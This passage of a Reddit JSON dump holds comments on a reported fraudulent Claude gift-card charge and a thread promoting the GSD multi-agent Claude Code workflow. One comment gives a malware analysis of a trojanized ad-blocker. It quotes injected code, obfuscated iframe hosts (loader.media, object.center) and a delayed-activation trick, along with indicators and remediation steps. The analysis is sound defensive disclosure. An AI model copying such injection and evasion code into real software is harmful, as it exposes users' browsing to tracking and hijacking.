                  "id": "o0cc2ok",
                  "author": "nineelevglen",
                  "text": "Klarna har engÃ¥ngskort i sin checkout!",
                  "score": 1,
                  "created_utc": "2026-01-18 19:24:33",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0cii99",
                  "author": "verbose-airman",
                  "text": "Revolut",
                  "score": 1,
                  "created_utc": "2026-01-18 19:55:42",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0bmlxl",
              "author": "LowSyllabub9109",
              "text": "Kindly, could I know what kind of \"temrporary 1 use month card\", so I can have one",
              "score": 2,
              "created_utc": "2026-01-18 17:26:27",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0dluhp",
                  "author": "Jones420_",
                  "text": "In my country we have Mb Way, but itâ€™s limited to only a few countries. Maybe in your country you have some kind of app like this. Where are you based ?",
                  "score": 1,
                  "created_utc": "2026-01-18 23:12:45",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0fs6im",
                  "author": "MiHumainMiRobot",
                  "text": "Usually with neobanks like Revolut",
                  "score": 1,
                  "created_utc": "2026-01-19 07:12:13",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0bcvio",
          "author": "twendah",
          "text": "Based indie company",
          "score": 26,
          "created_utc": "2026-01-18 16:40:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bpifj",
          "author": "Embarrassed-Load5100",
          "text": "Everyone is talking about temporary credit cards but itâ€™s just scary this happened. Should not be possible in the first place imho",
          "score": 5,
          "created_utc": "2026-01-18 17:40:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0dkxwh",
          "author": "Zulfiqaar",
          "text": "I extracted the browser extension, and analysed it with a group of agents - basically its probably that. I have notified Google but I recommend others do aswell.\n\n---\n\n\n# Security Analysis Report: \"Lock\" Adblock Extension\n\n#  VERDICT: MALICIOUS - DO NOT USE\n\n  This extension is a trojanized version of uBlock Origin Lite with malicious code injected.\n\n  ---\n#  Critical Findings  \n\n# 1. Hidden Iframe Injection (MALWARE)\n\n\n`js/scripting-manager.js:171` registers a universal content script `(id: \"loading-script\")` on matches: `[\"<all_urls>\"]` that\n    injects `js/spin.js` into pages.\n\n`js/background.js:79` stores an install/update timestamp `(chrome.storage.local.set({ i: ... }))` and `js/background.js:84` sends\n    it to every tab on load completion `(chrome.tabs.sendMessage(... { action: \"i\", data: res.i } ...)).`\n\n`js/spin.js:136` receives that message and, after ~8 hours, injects a hidden sandboxed iframe that loads a third-party URL:\n\n`js/spin.js:151` sets `loaderSpinner.src = \"//loader\" + \".\" + \"media/loading\"`, with sandbox flags allow-top-navigation allow-\n    same-origin allow-scripts `(js/spin.js:149).`\n\nThis causes outbound requests to loader.media from pages you visit, leaking at least your IP/User-Agent and typically\n        the full page URL via the Referer header (i.e., browsing history exfiltration). allow-top-navigation also enables the\n        iframe content to navigate the top page (redirect risk).\n\n  Location: `js/cs.js:12700-12706`\n`  loaderSpinner.src = \"//object\" + \".\" + \"center/centre\";`\n  - Triggers immediately on every page load\n  - Injects hidden iframe to object.center\n\n#  2. Malware Characteristics  \n\n\nTechnique | Description\n---|---\nURL Obfuscation    | Domains split with string concatenation to avoid detection           |\nDelayed Activation | 8-hour delay evades security scans and store reviews                 |\nCode Injection     | Malicious code hidden inside legitimate libraries (lodash, spinner)  |\nHidden Iframes     | display: none style to hide from users                               |\nDangerous Sandbox  | allow-top-navigation allow-same-origin allow-scripts enables attacks |\n\n#  3. Attack Flow\n\n  1. Extension installed â†’ stores timestamp in chrome.storage\n  2. Every page load â†’ background.js sends timestamp to all tabs\n  3. Content scripts check elapsed time\n  4. After threshold â†’ hidden iframe injected to external malware domains\n\n  ---\n  Suspicious Code Additions to `background.js`\n\n  Lines 79-91 (NOT in original uBlock Origin Lite):\n\n\n          chrome.runtime.onInstalled.addListener(function(e){\n              if (e.reason === \"install\" || e.reason === \"update\") {\n                  chrome.storage.local.set({ i: new Date().getTime() });\n              }\n          });\n          chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {\n              if (changeInfo.status === 'complete') {\n                  chrome.tabs.sendMessage(tabId, { action: \"i\", data: res.i }, ...);\n              }\n          });\n\n  ---\n\n#  What I did NOT find\n\n  No direct use of cookies, webRequest, history, downloads, nativeMessaging, or explicit fetch()/XHR to external APIs in the\n    main extension logic (the main network â€œbeaconâ€ behavior is via the injected iframes above).\n\n  ---\n#  Potential Malicious Purposes\n\n  1 - Ad Fraud / Click Fraud - Generating fake impressions/clicks  \n  2 - Cryptocurrency Mining - Using your CPU in background  \n  3 - Malvertising - Serving malicious ads  \n  4 - Session Hijacking - The iframe could steal cookies  \n  5 - Drive-by Downloads - Could attempt to download malware  \n  6 - Affiliate Fraud - Injecting affiliate codes  \n\n  ---\n#  Permissions Analysis\n\n  The extension requests these permissions (normal for an ad blocker, but abused here):\n   tabs - Can see all tab URLs  \n   scripting - Can inject code into pages  \n   <all_urls> (optional) - Access to all websites  \n   storage - Stores malware trigger timestamp  \n\n  ---\n#  Comparison with Legitimate uBlock Origin Lite\n\nAspect            | Legitimate                    | This Extension                     |\n-------------------|-------------------------------|------------------------------------|\nSource            | github.com/gorhill/uBlock     | Unknown \"Lock\" author              |\nbackground.js     | No install timestamp tracking | Tracks install time                |\ncs.js             | Clean lodash                  | Lodash + injected malware code     |\nspin.js           | Does not exist                | Spinner library + malware          |\nExternal requests | None from content scripts     | Hidden iframes to external domains |\n\n  ---\n#  Recommendations\n\n  1 - Immediately uninstall this extension  \n  2 - Clear browser cache and cookies  \n  3 - clear site data for loader.media (and object.center to be safe).  \n  4 - Review recent activity for suspicious behavior  \n  5 - Install from official sources only - Use the real uBlock Origin or uBlock Origin Lite from the official Chrome Web Store or Firefox Add-ons  \n  6 - Report this extension to the Chrome Web Store if found there  \n\n  ---\n#  IOCs (Indicators of Compromise)\n\n  Malicious Domains:  \nloader.media  \n   object.center  \n\n  Suspicious Storage Key:\n   chrome.storage.local key: i (installation timestamp)",
          "score": 4,
          "created_utc": "2026-01-18 23:08:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bojbf",
          "author": "paul_h",
          "text": "My teleco allows subscribes to purchase things including gift cards, and its goal of phone theives in my country. Also of account-takeover groups and that's not necessarily your SIM being handed to them on some basis. It was 30 mins of clicking around the teleco's shitty web interface to disable purchasing. A crook that has control of my laptop could log in, enable those again and start buying gift cards. I'd like to have \"permanently block purchases\" as a feature.  **Now you mention it for Anthropic**, I'm like to permanently block purchases on that account, too. Grrr",
          "score": 3,
          "created_utc": "2026-01-18 17:35:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bt5pf",
          "author": "throwaway510150999",
          "text": "Have you tried reaching out to their social channels like X, Linkedin?",
          "score": 3,
          "created_utc": "2026-01-18 17:57:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ez1th",
          "author": "Shivacious",
          "text": "Chargeback time op",
          "score": 3,
          "created_utc": "2026-01-19 03:38:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bp90d",
          "author": "Crinkez",
          "text": "Just use a secondary card/bank account for any untrustworthy vendors. I'm subbed to Codex Â£20 plan on my secondary card which almost never has more than Â£100 on it. Max overdraft is -Â£10",
          "score": 2,
          "created_utc": "2026-01-18 17:39:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0fk12h",
              "author": "Tall-Bug7108",
              "text": "This is a must nowadays!\nNever have any active card that doesnâ€™t have a daily spending limit",
              "score": 1,
              "created_utc": "2026-01-19 06:04:54",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0bsar7",
          "author": "emlanis",
          "text": "Bizarre!",
          "score": 2,
          "created_utc": "2026-01-18 17:53:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bysw3",
          "author": "Dry_Natural_3617",
          "text": "have you ever used this email and password on another site, as itâ€™s not unusual for other sites to get hacked and then they just run the email and password over a list of 1000s of other sites.",
          "score": 2,
          "created_utc": "2026-01-18 18:23:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0c0zcp",
              "author": "MobileNo8348",
              "text": "No.\n\nProton alias, 100% only claude ai.\n\nIâ€™m sufficiently bonkers, to isolate more than an average dude",
              "score": 2,
              "created_utc": "2026-01-18 18:32:59",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0c0x27",
          "author": "AshtavakraNondual",
          "text": "Wow hopefully you will get refunded in full. Do you have any vague idea on where the login got leaked? Maybe you authorized some third party app/tool and your session was used while it was still alive? or any other clues? I'm a bit careless and lazy myself, but this just prompted me to try and get used to using dev-containers",
          "score": 2,
          "created_utc": "2026-01-18 18:32:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0c9n1l",
          "author": "bitspace",
          "text": "> My card was already blocked for unrelated reasons  \n\nExpound on this. Was it blocked due to unrelated suspicious activity?",
          "score": 2,
          "created_utc": "2026-01-18 19:12:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0cq1xl",
              "author": "welcometoheartbreak",
              "text": "Itâ€™s been a while since I dealt with fraud prevention, but thatâ€™s a big olâ€™ red flag that OP might be the one committing fraud here.",
              "score": 2,
              "created_utc": "2026-01-18 20:32:25",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0e545m",
                  "author": "MobileNo8348",
                  "text": "No. Banks like my rating. If itâ€™s up to them i would already have another.\n\nI simply cancelled the credit card last Thursday because itâ€™s bad habits. Especially with a quite big frame as I had it.",
                  "score": 0,
                  "created_utc": "2026-01-19 00:54:05",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0e4diw",
              "author": "MobileNo8348",
              "text": "My new years resolution was no credit card. So about one week ago I cancelled my card. Super happy about that. It had a $10k limit, far too much.\n\nI got lucky, and avoided quite some trouble that way",
              "score": 1,
              "created_utc": "2026-01-19 00:50:08",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0ce7hy",
          "author": "D-duro",
          "text": "The exact same thing happened to me, including that email. It took a day for customer service to reply and refund the money. I actually found malware on my computer, so make sure you scan yours with Malwarebytes. I really suspect something fishy is going on, specifically with people gaining unauthorized access to Claude.",
          "score": 2,
          "created_utc": "2026-01-18 19:34:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0cfe4c",
              "author": "D-duro",
              "text": "Also, the Claude gift function is definitely broken. I was lucky to get my money back, but customer support didn't seem to care about following up on the issue at all. Go figure.",
              "score": 2,
              "created_utc": "2026-01-18 19:40:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0cenut",
          "author": "jwhite_nc",
          "text": "Be mindful to download your data from Anthropic. I had an issue with a Credit Card and never could in touch with a human and they banned my account permanently.",
          "score": 2,
          "created_utc": "2026-01-18 19:37:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0cmlob",
          "author": "Viriaro",
          "text": "Damn. I'm surprised the BankID check didn't trigger for that amount ðŸ˜¨ This is worrying.",
          "score": 2,
          "created_utc": "2026-01-18 20:15:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0cq2kp",
          "author": "Coded_Kaa",
          "text": "Support got back to me 1 week later, when I tried the email support. Shitty support system, mtchewwww",
          "score": 2,
          "created_utc": "2026-01-18 20:32:31",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0da4xw",
          "author": "rietti",
          "text": "Fraud detection was vibecoded and the perpetrator told the chat to not worry about it.\n\n\nI'm sorry bro, this shit is not a joke, hope the best for you :(",
          "score": 2,
          "created_utc": "2026-01-18 22:16:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0dyq44",
          "author": "Ok-Way-3584",
          "text": "This reminds me of Cowork's security.",
          "score": 2,
          "created_utc": "2026-01-19 00:20:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0emduf",
          "author": "sharyphil",
          "text": "Perfect! You're absolutely right!",
          "score": 2,
          "created_utc": "2026-01-19 02:29:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ewqha",
          "author": "Otherwise-Way1316",
          "text": "Thatâ€™s how they show up for sale on reddit so cheapâ€¦ mystery solved",
          "score": 2,
          "created_utc": "2026-01-19 03:25:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0flcuh",
          "author": "zlingman",
          "text": "people donâ€™t like this idea generally but the one actor in this scenario perfectly placed to enact such a heist is the claude intelligence itself. and that closely squares with what i have experienced from claude.",
          "score": 2,
          "created_utc": "2026-01-19 06:15:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bnyv6",
          "author": "throwaway510150999",
          "text": "What is someone going to do with 5k in Claude credit?",
          "score": 1,
          "created_utc": "2026-01-18 17:32:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0bpi45",
              "author": "BuildAISkills",
              "text": "Code for a whole work day.",
              "score": 7,
              "created_utc": "2026-01-18 17:40:15",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0br6yc",
              "author": "Sovex66",
              "text": "Code for 2 hours",
              "score": 3,
              "created_utc": "2026-01-18 17:48:09",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0db7y7",
              "author": "whatsbetweenatoms",
              "text": "hack the planet!",
              "score": 1,
              "created_utc": "2026-01-18 22:21:22",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0ex5hi",
              "author": "Otherwise-Way1316",
              "text": "Sell it on reddit",
              "score": 1,
              "created_utc": "2026-01-19 03:27:33",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0br5zo",
          "author": "codergaard",
          "text": "You should submit a security report via the link at [https://trust.anthropic.com/](https://trust.anthropic.com/) \\- if you are correct that your credentials have not been compromised, it is important that this is escalated.",
          "score": 1,
          "created_utc": "2026-01-18 17:48:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0crcpp",
          "author": "schemeseuz",
          "text": "Send me a DM",
          "score": 1,
          "created_utc": "2026-01-18 20:38:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0eu4hw",
          "author": "Gloomy-Eggplant5428",
          "text": "Dude, you wrote this with ai?",
          "score": 0,
          "created_utc": "2026-01-19 03:10:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0fm6e1",
              "author": "MobileNo8348",
              "text": "Itâ€™s a monty python sketch style writing. Thatâ€™s how I roll on Reddit to keep people engaged in reading. Attention is scarce. Not kidding\n\nIf it was a low effort post nobody would read it. And the story is very important and not to be missed\n\nEdit: yet still not all go beyond the headline, based on some comments",
              "score": 1,
              "created_utc": "2026-01-19 06:21:59",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0fvrn8",
          "author": "fr4iser",
          "text": "Do I have a misunderstanding? I thought alias system is nothing else then filtering ? How should this protect you? Do u use password manager? 2FA , yubikey or something ? Think about security hardening. I would say in 99% of all frauds is the problem sitting right in front of it.",
          "score": 0,
          "created_utc": "2026-01-19 07:43:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0fxd1c",
              "author": "MobileNo8348",
              "text": "Because they assume that the password and email were reused. Which is not the case. Iâ€™ve a couple hundred aliases (900)( randomly looking emails that direct to my main) think of it like Appleâ€™s hide my mail\n\nYes proton pass does it. Itâ€™s a well integrated password manager \n\nYes physical MFA is yubi and titan keys (thatâ€™s already clear from reading my post, if you ever did)\n\nNo the problem in this situation is claude.\n\nMy security and opsec patterns are far above average\n\nDonâ€™t even think of shifting blame to the victim.",
              "score": 1,
              "created_utc": "2026-01-19 07:58:10",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qf6vcc",
      "title": "I've Massively Improved GSD (Get Shit Done)",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qf6vcc/ive_massively_improved_gsd_get_shit_done/",
      "author": "officialtaches",
      "created_utc": "2026-01-17 07:25:11",
      "score": 214,
      "num_comments": 74,
      "upvote_ratio": 0.93,
      "text": "A few weeks ago I posted about **Get Shit Done** when it was at \\~100 users. Since then we've gone on to hit 3,300 stars and crossed 15,000 installs. Time for an update.\n\n[https://github.com/glittercowboy/get-shit-done](https://github.com/glittercowboy/get-shit-done)\n\n# The Big Changes\n\n**Multi-agent orchestration that actually works.**\n\nWhen I first posted, execution was single-threaded. Now the system spawns specialized agents in parallel â€” 4 researchers investigating your domain simultaneously, multiple executors building different parts of your codebase at once, a dedicated verifier checking if the code actually achieves what you asked for.\n\nThe absolutely bonkers part is that your main context window stays at 30-40% even after deep research or thousands of lines of code getting written. All heavy lifting happens consistently in fresh 200k subagent contexts.\n\n**Plans get verified before they run.**\n\nI got tired of watching Claude write plans that missed requirements or had broken dependencies. Now there's a planner â†’ checker â†’ revise loop. Plans don't execute until they pass verification. If the checker finds issues, the planner fixes them automatically.\n\n**Automatic debugging when things break.**\n\nThe new `/gsd:verify-work` command walks you through testing what got built. \"Can you log in?\" Yes/no. If something's broken, it spawns debug agents to find the root cause, creates fix plans, verifies those plans, and hands you a ready-to-execute solution. You don't debug â€” you just run `/gsd:execute-phase` again.\n\n**The discuss-phase breakthrough.**\n\nThis is the best update I reckon. Before planning, you now feed your preferences into the system â€” how you want the UI laid out, what the error messages should say, how the CLI flags should work. That context flows into research (so it investigates the right patterns) and planning (so it builds what you actually want, not reasonable defaults).\n\n# Meta Building\n\nThe system builds itself. Every GSD improvement gets planned and executed using GSD. It's the most meta thing I've ever worked on and it just keeps getting better.\n\n# The Philosophy Hasn't Changed\n\nI still don't want to cosplay as an enterprise team. I still just want to describe what I want and have it built correctly.\n\nThe difference now is the system is *so much smarter* about how it does that. Research before planning. Verification before execution. Debugging when things break. Fresh context for every heavy operation.\n\nIt's not magic. It's just really good context engineering wrapped in a workflow that doesn't get in your way.\n\n    npx get-shit-done-cc\n\nWith love,\n\nLex\n\n**P.S.** Once you've downloaded the newest version, you can simply run `/gsd:update` to get the latest. The update command now shows you what changed and asks before installing â€” no more mystery upgrades.",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qf6vcc/ive_massively_improved_gsd_get_shit_done/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "o02pss8",
          "author": "officialtaches",
          "text": "Here's some extra context for those who are bound to ask \"yeah but what is it?\"\n\nClaude has \\~200k tokens of context. At 10% usage it's sharp. At 50%+ quality tanksâ€”hallucinations, forgotten constraints, drift. One long conversation building a real project = inevitable degradation.\n\n**The fix: Orchestrator + Fresh Subagents**\n\nInstead of one conversation doing everything, GSD splits it:\n\n\\- **Orchestrator** uses \\~10-15% context. Reads plan metadata, coordinates, spawns workers, collects results. Never executes code itself.\n\n\\- **Subagents** each get fresh 200k context. Load one plan, execute its tasks, commit, write summary, die. Plan 5 has identical quality to Plan 1.\n\n**Wave-based parallelism**\n\nPlans get pre-assigned wave numbers during planning:\n\nWave 1: \\[plan-01, plan-02, plan-03\\] â†’ 3 agents in parallel\n\nWave 2: \\[plan-04, plan-05\\] â†’ 2 agents in parallel (waits for wave 1)\n\nWave 3: \\[plan-06\\] â†’ 1 agent\n\nSame wave = no dependencies = parallelize. Higher wave = may depend on earlier = wait. A 6-plan phase runs in 3 rounds instead of 6.\n\n**Files as long-term memory**\n\nClaude has no memory between sessions. GSD uses disk:\n\n\\- \\`PROJECT.md\\` â€” vision/constraints (stable reference)\n\n\\- \\`STATE.md\\` â€” current position, decisions, blockers (instant resumption after /clear)\n\n\\- \\`PLAN.md\\` â€” executable task specs (not docsâ€”actual prompts subagents execute)\n\n\\- \\`SUMMARY.md\\` â€” what was built (per plan)\n\n\\- \\`VERIFICATION.md\\` â€” proof the goal was achieved\n\nFirst step of every workflow reads STATE.md. Context restored instantly.\n\n**Goal-backward verification**\n\nTask completion â‰  goal achievement. Tasks can be \"done\" but deliver stubs.\n\nGSD works backwards from the phase goal:\n\n1. What must be TRUE for \"users can chat in real-time\"?\n2. What artifacts must EXIST? (Chat.tsx, /api/chat, Message schema)\n3. Are they WIRED? (Component actually calls API? API actually queries DB?)\n4. Are they SUBSTANTIVE? (Real code, not TODO comments or empty returns)\n\nCatches orphaned files, missing integrations, stub implementations.\n\n**Atomic git history**\n\nEach task = one commit. \\`git bisect\\` finds the exact failing task. \\`git revert\\` undoes one change cleanly. Future Claude sessions read history for context.\n\n\\---\n\n**TL;DR:** Fresh subagents prevent context rot. Parallel waves speed execution. Files on disk = persistent memory. Goal-backward verification catches \"done but broken.\" Atomic commits make everything reversible.",
          "score": 31,
          "created_utc": "2026-01-17 08:37:35",
          "is_submitter": true,
          "replies": [
            {
              "id": "o02tipe",
              "author": "rand0anon",
              "text": "Can this be implemented in flight? I want to apply it to my project",
              "score": 4,
              "created_utc": "2026-01-17 09:12:36",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o035y34",
                  "author": "corpa",
                  "text": "Yeah with an existing Project you also start with the \"/gsd:new-project\" command and it researches your project and creates the project.md and other files. I already tried this in one of my existing projects but it wasnt a huge project.",
                  "score": 8,
                  "created_utc": "2026-01-17 11:09:19",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o02snv0",
              "author": "El_Spanberger",
              "text": "This sounds great. Appreciate I'm late to the party on this, but only discovered about the smart/dumb zones of context this week. It explains a lot. Got a couple of things I was planning to have a go at over the weekend, so will give this a try!",
              "score": 3,
              "created_utc": "2026-01-17 09:04:27",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o08qqyt",
              "author": "wolverin0",
              "text": "https://github.com/glittercowboy/get-shit-done/issues/97#issuecomment-3761274487 or something thst does something similar! Please!!",
              "score": 1,
              "created_utc": "2026-01-18 05:18:08",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o02iy6w",
          "author": "getaway-3007",
          "text": "Hello OP, I would like to add a suggestion, could you showcase the project by building something incrementally and have that linked in GitHub.\n\nSo a project you built from scratch which had 3 features and then you iterate over it and add 2-3 new features.\n\nI'm exploring whether to use this, [clavix](https://github.com/ClavixDev/Clavix) or the ralph wiggum method",
          "score": 22,
          "created_utc": "2026-01-17 07:34:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02jpzv",
              "author": "officialtaches",
              "text": "Great idea! Yes I'll do that in a livestream on Monday :)\n\nIn the meantime you can see a demo here (although most of the new features I mentioned in this post were implemented in the last 24 hours).\n\n[https://www.youtube.com/watch?v=5L3dm7KBCmY](https://www.youtube.com/watch?v=5L3dm7KBCmY)",
              "score": 17,
              "created_utc": "2026-01-17 07:41:25",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o02opa6",
          "author": "AsterixBT",
          "text": "I've made a run from yesterday to today and already done with milestone 1.  \n\nIt's awesome. Kudos to you!",
          "score": 8,
          "created_utc": "2026-01-17 08:27:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02p2yl",
              "author": "officialtaches",
              "text": "Awesome! Glad you're enjoying it :)\n\nI'd update if I were you though ðŸ˜‰\n\n    npx get-shit-done-cc",
              "score": 3,
              "created_utc": "2026-01-17 08:30:54",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o02s1ej",
                  "author": "AsterixBT",
                  "text": "It's hard not to enjoy it as it follows my usual workflow for the last several years. Great job once again!  \n\nI surely will update once i go through the changeset. Afterall it's in the repo's readme that one should be ready for frequent updates  :)\n\nAll that... once I get back on the computer (or should I say terminal).",
                  "score": 3,
                  "created_utc": "2026-01-17 08:58:31",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o043j0t",
                  "author": "AsterixBT",
                  "text": "It caught my attention that after the update when calling /clear a new window shows up. Does this have something to do with \"surviving clear\" commands? I didn't have enough time to investigate.\n\nEDIT: it's the check for update on new session.  \nIt seems like it started using a lot of web searches, and I mean ... alot :)  \nAlso quite bruteforcing with multiple subagents. Which makes token usage significantly higher.",
                  "score": 1,
                  "created_utc": "2026-01-17 14:54:55",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o02vmvx",
          "author": "foobarstrap",
          "text": "Thanks for GSD. I had a go with it yesterday my time. Started with a Brown field PoC-grade eBPF Firewall which Had no UI nor API to configure it.\nI generated an UI using Google aistudio, then initialized the Project, did the Research and everything. It went smoothly throghout - it was able to connect most things. Its really impressive given, that it runs mostly unattended, and that there are no stub Implementations as you see them often.\nI ran with Opus throghout, and let it cook for 2-3 hours, occasionally  hitting enter / approving after the plan/requirements phase where i put more effort into building the roadmap. It churned through ~60 USD worth of API cost which seems reasonable given the background research, and everything.\n\nEspecially the planning for several milestones ahead was useful, now i got a roadmap and can continue after stabiliting the first milestone.\n\nI noticed one Gap where I'm not sure If this is my problem or should be fixes in the system/agent prompt:\n\n1. The plan / execution didn't produce ANY Tests - Not for the API, nor for the UI, and not for the glue between the API and the eBPF world. No integration or e2e Tests.\n\n\nI implicitly assumed, that tests are part of each milestones/phase/wave andnthat there's no need to explicitly add that as a requirement.\n\nThat said, it may be worth experimenting with the verification step: e.g. asking the user If he wants to create unit/integration tests before moving on.\nI feel that this is the point where one should verify that all the pieces are integrated nicely.",
          "score": 9,
          "created_utc": "2026-01-17 09:32:49",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o02qu6q",
          "author": "Nilsolivier",
          "text": "Hi, love the work! However, im wondering about how this uses the Claude models. I have the max plan (5x) which is somewhat limiting using opus 100% of the time. How does this setup use the models? if run it with opus, does it send the subagents as opus, sonnet or haiku? Is there any point in using opus as the \"Orchestrator\" when it's just the messenger? (or maybe it's taking important decisions, hard to see). What do you think? How do you use it? Thanks!",
          "score": 6,
          "created_utc": "2026-01-17 08:47:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02rfqp",
              "author": "officialtaches",
              "text": "I run Opus 4.5 all day and rarely hit limits unless going HAM. If I do - it's around 1 hour max before rest. \n\nNo reason you couldn't make the main orchestrator use even Haiku as all the complex work is handles by subagents that could be Opus.",
              "score": 3,
              "created_utc": "2026-01-17 08:52:51",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o02rmel",
                  "author": "Nilsolivier",
                  "text": "Okay, itâ€™s more the weekly limit that is a problem for me. When you say â€that could be opusâ€, what decides what model itâ€™s using? :)",
                  "score": 5,
                  "created_utc": "2026-01-17 08:54:35",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o035qh2",
              "author": "AdCommon2138",
              "text": "Consider buying Gemini 20$ option. You get separately: Jules, tokens for opus almost equivalent to 20 sub, and then Gemini high/low with separate limits for Gemini flash. I'm going to reduce my pro to lower tier next mong and get codex as well so that will be 40 pocketed while probably having even better results by using multi agent approach.",
              "score": 3,
              "created_utc": "2026-01-17 11:07:22",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o08v2ci",
                  "author": "songokussm",
                  "text": "How would you use this in Gemini or codex ?",
                  "score": 1,
                  "created_utc": "2026-01-18 05:50:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o03td4f",
          "author": "GimmeThatHotGoss",
          "text": "Iâ€™ve been using GSD on all my projects for a few weeks now after joining your live stream by accident. I was skeptical at first but then after going back to speckit for a project - really felt the difference.",
          "score": 6,
          "created_utc": "2026-01-17 14:00:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o04k4rf",
          "author": "RoninNionr",
          "text": "I'm adopting GSD in the middle of an ongoing client project, not from the start. I already have a large, established [CLAUDE.md](http://CLAUDE.md) that I've been maintaining (code style, schema, architecture, common commands, project context).\n\nLooking at GSD, it creates its own documentation in `.planning/` (PROJECT.md, STATE.md, codebase/) but doesn't seem to read or integrate with existing CLAUDE.md.\n\nSince Claude Code loads [CLAUDE.md](http://CLAUDE.md) automatically into every session, I'm now facing:\n\n* Potential duplication (CLAUDE.md + .planning/ docs)\n* Context window waste\n* Unclear what to keep where\n\n**Questions:**\n\n1. For those who adopted GSD mid-project: how did you handle your existing CLAUDE.md?\n2. What should stay in [CLAUDE.md](http://CLAUDE.md) vs move to .planning/?\n3. Would a `/gsd:import-claude-md` or similar command make sense as a feature for mid-project adoption?",
          "score": 5,
          "created_utc": "2026-01-17 16:16:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o04myr6",
              "author": "BassMillerTime",
              "text": "Had this same question. Debating on slimming my Claude md down to just include command shortcuts and a few other things. Then if I ever move off gsd I can have it rebuild architecture from the gsd mds",
              "score": 1,
              "created_utc": "2026-01-17 16:29:50",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o05da5d",
                  "author": "RoninNionr",
                  "text": "I have a workaround:  \nUse simple script to rename [CLAUDE.md](http://CLAUDE.md) while using GSD and rename it back when we need to use CC in the project outside GSD.  \nEDIT:\n\nOr even cleaner:   \nSeparate git worktree for non-GSD work with [CLAUDE.md](http://CLAUDE.md) gitignored, though that adds sync overhead.",
                  "score": 1,
                  "created_utc": "2026-01-17 18:32:01",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o02rd7g",
          "author": "Milkpowder44",
          "text": "this is bonkers. Really like it. Only minor gripe is the new popup feature that shows when I'm able to input to Claude again",
          "score": 5,
          "created_utc": "2026-01-17 08:52:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02rhfa",
              "author": "officialtaches",
              "text": "Update! I removed it lol.\n\n**Edit: Actually you may need to manually delete .claude/hooks/gsd-notify.sh until I make the install script delete it.**",
              "score": 4,
              "created_utc": "2026-01-17 08:53:18",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o02sxu8",
          "author": "Hozukr",
